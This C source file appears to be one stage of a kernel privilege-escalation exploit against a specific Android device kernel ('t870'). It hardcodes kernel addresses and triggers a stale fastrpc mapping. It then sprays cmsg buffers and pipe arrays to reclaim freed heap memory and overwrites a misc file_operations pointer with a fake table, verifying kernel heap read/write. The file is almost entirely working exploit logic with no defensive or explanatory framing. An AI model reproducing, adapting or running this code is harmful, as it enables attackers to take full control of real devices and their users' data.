#include "t870_bridge.h"

#include "t870_cmsg_wave.h"
#include "t870_detached_owner.h"
#include "t870_pipe_wave.h"
#include "t870_reclaim_layout.h"

#include <errno.h>
#include <inttypes.h>
#include <stdio.h>
#include <stdlib.h>

#define T870_DIRECT_MAP_BASE 0xffffffc000000000ULL
#define T870_DIRECT_MAP_END 0xffffffc300000000ULL
#define T870_VMEMMAP_START 0xffffffbf00000000ULL
#define T870_VMEMMAP_END 0xffffffbf0c000000ULL
#define T870_STATIC_MISC_FOPS_DIRECT 0xffffffc00338d1e8ULL
#define T870_STATIC_ANON_PIPE_BUF_OPS 0xffffff8009e21e00ULL
#define T870_MAX_SLIDE 0x001f0000ULL
#define T870_P0_ALIGNMENT 0x1000ULL
#define T870_SKB_DATA_BACKSHIFT 0x0e80ULL
#define T870_FOPS_TABLE_OFF 0x2000ULL
#define T870_ORDER3_SIZE 0x8000ULL

#define T870_FIRST_CMSG_SENDERS 1U
struct t870_bridge_resources {
    struct t870_cmsg_wave first;
    struct t870_cmsg_wave second;
    struct t870_pipe_wave pipes;
    int first_prepared;
    int second_prepared;
    int pipes_prepared;
};

static int aligned_slide(uint64_t value, uint64_t base)
{
    uint64_t slide;

    if (value < base)
        return 0;
    slide = value - base;
    return slide <= T870_MAX_SLIDE &&
        (slide & (T870_P0_ALIGNMENT - 1U)) == 0U;
}

static int validate_inputs(const struct t870_bridge_inputs *inputs,
                           int heap_rw_checkpoint)
{
    uint64_t direct_delta;
    uint64_t expected_page;

    if (inputs->payload_base < T870_DIRECT_MAP_BASE ||
        inputs->payload_base + T870_ORDER3_SIZE > T870_DIRECT_MAP_END ||
        (inputs->payload_base & (T870_ORDER3_SIZE - 1U)) != 0U)
        return 0;
    if (inputs->fake_fops != inputs->payload_base -
        T870_SKB_DATA_BACKSHIFT + T870_FOPS_TABLE_OFF)
        return 0;
    if (!aligned_slide(inputs->anon_pipe_buf_ops,
                       T870_STATIC_ANON_PIPE_BUF_OPS))
        return 0;
    if (heap_rw_checkpoint) {
        if (inputs->misc_fops_direct < inputs->payload_base ||
            inputs->misc_fops_direct + sizeof(uint64_t) >
                inputs->payload_base + T870_ORDER3_SIZE)
            return 0;
    } else if (!aligned_slide(inputs->misc_fops_direct,
                              T870_STATIC_MISC_FOPS_DIRECT) ||
               (inputs->misc_fops_direct & 0xfffU) != 0x1e8U) {
        return 0;
    }

    direct_delta = inputs->misc_fops_direct - T870_DIRECT_MAP_BASE;
    expected_page = T870_VMEMMAP_START +
        ((direct_delta >> 12U) * 0x40U);
    if (inputs->misc_fops_page != expected_page ||
        inputs->misc_fops_page < T870_VMEMMAP_START ||
        inputs->misc_fops_page >= T870_VMEMMAP_END)
        return 0;
    return 1;
}

static void clean_resources(struct t870_bridge_resources *resources)
{
    int saved_errno = errno;

    if (resources->first_prepared)
        t870_cmsg_wave_release(&resources->first);
    if (resources->second_prepared)
        t870_cmsg_wave_release(&resources->second);
    if (resources->pipes_prepared)
        t870_pipe_wave_release(&resources->pipes);
    free(resources);
    errno = saved_errno;
}

static int dirty_failure(struct t870_bridge_context *context,
                         const char *stage)
{
    fprintf(stderr, "[-] bridge dirty failure stage=%s; retaining owner "
            "resources and refusing retry\n", stage);
    if (context->hooks.mark_nonretryable != NULL)
        context->hooks.mark_nonretryable(context->hooks.opaque);
    return T870_OWNER_DIRTY_FAILURE;
}

int t870_bridge_worker(void *opaque)
{
    struct t870_bridge_context *context = opaque;
    struct t870_bridge_resources *resources;
    unsigned char safe_map[T870_CMSG_CONTROL_SIZE];
    unsigned char pipe_write[T870_CMSG_CONTROL_SIZE];
    uint64_t heap_readback = 0;
    unsigned int reclaimed_pipe = 0;
    unsigned int count;
    int matches;
    int arm_result;

    if (context == NULL ||
        !validate_inputs(&context->inputs, context->heap_rw_checkpoint) ||
        context->hooks.arm_stale_map == NULL ||
        context->hooks.release_stale_map == NULL ||
        (!context->heap_rw_checkpoint &&
         context->hooks.verify_original_route == NULL)) {
        fprintf(stderr, "[-] bridge input contract rejected\n");
        return EINVAL;
    }
    resources = calloc(1, sizeof(*resources));
    if (resources == NULL)
        return ENOMEM;

    t870_build_safe_map_control(safe_map);
    t870_build_pipe_write_control(
        pipe_write, context->inputs.misc_fops_page,
        (uint32_t)(context->inputs.misc_fops_direct & 0xfffU),
        context->inputs.anon_pipe_buf_ops);

    if (t870_cmsg_wave_prepare(&resources->first, safe_map,
                               "bridge-first") != 0)
        goto clean_failure;
    resources->first_prepared = 1;
    if (t870_cmsg_wave_prepare(&resources->second, pipe_write,
                               "bridge-second") != 0)
        goto clean_failure;
    resources->second_prepared = 1;
    if (t870_pipe_wave_prepare(&resources->pipes, 0) != 0)
        goto clean_failure;
    resources->pipes_prepared = 1;

    /* arm_stale_map() is the first non-recoverable kernel transition. */
    arm_result = context->hooks.arm_stale_map(context->hooks.opaque);
    if (arm_result == T870_OWNER_DIRTY_FAILURE)
        return dirty_failure(context, "fastrpc-arm");
    if (arm_result != 0)
        goto clean_failure;
    if (context->hooks.mark_nonretryable != NULL)
        context->hooks.mark_nonretryable(context->hooks.opaque);

    /* These allocations must occur after map B was unmapped. */
    count = t870_cmsg_wave_start_count(&resources->first,
                                      T870_FIRST_CMSG_SENDERS);
    printf("[*] bridge first wave blocked=%u/%u ordered_single_reclaim=1\n",
           count, T870_FIRST_CMSG_SENDERS);
    if (count != T870_FIRST_CMSG_SENDERS)
        return dirty_failure(context, "first-wave");

    if (context->hooks.release_stale_map(context->hooks.opaque) != 0)
        return dirty_failure(context, "fastrpc-release");

    count = t870_pipe_wave_populate(&resources->pipes, 3U);
    printf("[*] bridge pipe arrays populated=%u/%u\n", count,
           T870_PIPE_WAVE_COUNT);
    if (count != T870_PIPE_WAVE_COUNT)
        return dirty_failure(context, "pipe-populate");

    if (context->heap_rw_checkpoint) {
        count = t870_pipe_wave_drain_prefix(&resources->pipes, 2U);
        printf("[*] bridge pipe prefix drained=%u/%u curbuf=2 nrbufs=1\n",
               count, T870_PIPE_WAVE_COUNT);
        if (count != T870_PIPE_WAVE_COUNT)
            return dirty_failure(context, "pipe-prefix-drain");
    }

    /* Delayed sock_kfree_s now frees the one live replacement pipe array. */
    t870_cmsg_wave_release(&resources->first);
    resources->first_prepared = 0;

    count = t870_cmsg_wave_start(&resources->second);
    printf("[*] bridge second wave blocked=%u/%u\n", count,
           T870_CMSG_WAVE_SENDERS);
    if (count != T870_CMSG_WAVE_SENDERS)
        return dirty_failure(context, "second-wave");

    if (context->heap_rw_checkpoint)
        matches = t870_pipe_wave_find_zero_length_after_drain(
            &resources->pipes, &reclaimed_pipe);
    else
        matches = t870_pipe_wave_find_zero_length(
            &resources->pipes, &reclaimed_pipe);
    printf("[*] bridge second reclaim FIONREAD matches=%d expected=1 "
           "candidate=%u normal_bytes=%u\n", matches, reclaimed_pipe,
           (context->heap_rw_checkpoint ? 1U : 3U) *
               T870_PIPE_WAVE_PAGE_SIZE);
    if (matches != 1)
        return dirty_failure(context, "second-reclaim-checkpoint");

    if (t870_pipe_wave_write_one(
            &resources->pipes, reclaimed_pipe, &context->inputs.fake_fops,
            sizeof(context->inputs.fake_fops)) != 0)
        return dirty_failure(context, "target-write");
    printf("[*] bridge target write pipe=%u target=%016" PRIx64
           " value=%016" PRIx64 "\n", reclaimed_pipe,
           context->inputs.misc_fops_direct, context->inputs.fake_fops);

    if (context->heap_rw_checkpoint) {
        if (t870_pipe_wave_read_one(
                &resources->pipes, reclaimed_pipe, &heap_readback,
                sizeof(heap_readback)) != 0)
            return dirty_failure(context, "heap-readback");
        if (heap_readback != context->inputs.fake_fops)
            return dirty_failure(context, "heap-readback-mismatch");
        printf("[+] bridge heap read/write verified target=%016" PRIx64
               " value=%016" PRIx64 "; owner resources retained\n",
               context->inputs.misc_fops_direct, heap_readback);
        return 0;
    }

    if (!context->hooks.verify_original_route(context->hooks.opaque))
        return dirty_failure(context, "original-route-verification");

    puts("[+] bridge original route verified; retaining second wave and "
         "pipe descriptors");
    return 0;

clean_failure:
    clean_resources(resources);
    return errno != 0 && errno < T870_OWNER_DIRTY_FAILURE ? errno : EIO;
}
